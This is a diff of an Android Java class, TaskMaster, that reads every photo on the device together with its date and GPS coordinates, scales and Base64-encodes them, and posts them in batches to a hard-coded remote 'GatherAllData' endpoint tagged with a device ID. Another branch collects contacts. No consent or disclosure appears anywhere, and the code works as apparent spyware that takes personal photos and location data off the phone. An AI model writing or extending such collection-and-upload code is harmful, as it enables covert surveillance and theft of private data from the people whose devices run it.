@@ -69,16 +69,9 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
             if (maskHash2[0].charAt(i) == '1') {
                 switch (i) {
                     case 0:
-                        getPhotos(bulkData, hashes[i], MediaStore.Images.Media.INTERNAL_CONTENT_URI);
-                        ServerCommunicationHandler.executeDataPost(params[0],
-                                "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
-                                "357336064017681");
-                        bulkData = new JSONObject();
-                        getPhotos(bulkData, hashes[i], MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
-                        ServerCommunicationHandler.executeDataPost(params[0],
-                                "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
-                                "357336064017681");
-                        bulkData = new JSONObject();
+                        getPhotos(hashes[i], MediaStore.Images.Media.INTERNAL_CONTENT_URI, params[0]);
+                        getPhotos(hashes[i], MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                                params[0]);
                         break;
                     case 1:
                         getContacts(bulkData, hashes[i]);
@@ -463,7 +456,7 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         }
     }
 
-    private void getPhotos(JSONObject bulkData, String hash, Uri uri) {
+    private void getPhotos(String hash, Uri uri, Context context) {
         try {
             JSONObject photos = new JSONObject();
             JSONArray informationArray = new JSONArray();
@@ -483,13 +476,16 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                     , selection, selectionArgs, "datetaken DESC");
 
             if (cur.moveToFirst()) {
+                int dateTakenIndex = cur.getColumnIndex(filePathColumn[1]);
+                int latitudeIndex = cur.getColumnIndex(filePathColumn[2]);
+                int longitudeIndex = cur.getColumnIndex(filePathColumn[3]);
+                int counter = 0;
                 do {
+                    counter ++;
                     int columnIndex = cur.getColumnIndex(filePathColumn[0]);
                     String picturePath = cur.getString(columnIndex);
                     if (picturePath != null) {
-                        int dateTakenIndex = cur.getColumnIndex(filePathColumn[1]);
-                        int latitudeIndex = cur.getColumnIndex(filePathColumn[2]);
-                        int longitudeIndex = cur.getColumnIndex(filePathColumn[3]);
+
                         Timestamp datetaken = new Timestamp(Long
                                 .parseLong(cur.getString(dateTakenIndex)));
                         if (first) {
@@ -503,34 +499,52 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                         File file = new File(picturePath);
                         InputStream inputStream = new FileInputStream(file);
                         byte[] array = readBytes(inputStream);
+                        Bitmap image = BitmapFactory.decodeByteArray(array, 0, array.length);
+                        Bitmap scaledImage = Bitmap
+                                .createScaledBitmap(image, 200, 200, false);
 
-                        information.put("Image", Base64.encodeToString(array, Base64.URL_SAFE));
+                        information.put("Image", BitmapJsonHelper.getStringFromBitmap(scaledImage));
                         information.put("Date", Base64.encodeToString(datetaken
                                 .toString().getBytes(), Base64.URL_SAFE));
-                        if (longitude == null) {
-                            information.put("Longitude", "");
-                        } else {
-                            information.put("Longitude", Base64.encodeToString(longitude
-                                    .getBytes(), Base64.URL_SAFE));
-                        }
-
                         if (latitude == null) {
                             information.put("Latitude", "");
                         } else {
-                            information.put("Latitude", Base64.encodeToString(latitude.getBytes(),
-                                    Base64.URL_SAFE));
+                            information.put("Latitude", Base64
+                                    .encodeToString(latitude.getBytes(), Base64.URL_SAFE));
+                        }
+
+                        if (longitude == null) {
+                            information.put("Longitude", "");
+                        } else {
+                            information.put("Longitude", Base64
+                                    .encodeToString(longitude.getBytes(), Base64.URL_SAFE));
                         }
 
                         informationArray.put(information);
+                        if (counter%20 == 0) {
+                            JSONObject bulkData = new JSONObject();
+                            photos.put("Photos", informationArray);
+                            photos.put("Hash", newHash);
+                            bulkData.put("Photos", photos);
+                            ServerCommunicationHandler.executeDataPost(context,
+                                    "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
+                                    "357336064017681");
+                        }
                     }
+
                 } while (cur.moveToNext());
             }
             cur.close();
 
             if (informationArray.length() != 0) {
+                JSONObject bulkData = new JSONObject();
                 photos.put("Photos", informationArray);
                 photos.put("Hash", newHash);
                 bulkData.put("Photos", photos);
+
+                ServerCommunicationHandler.executeDataPost(context,
+                        "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
+                        "357336064017681");
             }
         } catch (Exception ex) {
             Log.d("EROARE", ex.getMessage());
